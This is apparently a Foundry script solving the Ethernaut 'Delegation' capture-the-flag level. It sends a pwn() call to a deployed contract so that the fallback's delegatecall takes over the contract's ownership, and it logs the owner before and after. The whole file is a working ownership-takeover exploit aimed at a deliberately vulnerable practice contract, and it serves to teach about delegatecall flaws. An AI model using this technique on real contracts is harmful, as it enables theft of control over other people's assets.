// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegateSolution is Script {

    Delegation public delegation = Delegation(0xb061268f8a69b8332FcEaeDdBf5c8A5efd155AA2);

    function run() external {
     
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      console.log("Before Owner:", delegation.owner());
      address(delegation).call(abi.encodeWithSignature("pwn()")); 
      console.log("After Owner:", delegation.owner());
      console.log("My Address:", vm.envAddress("MY_ADDRESS"));
      vm.stopBroadcast();
    }

}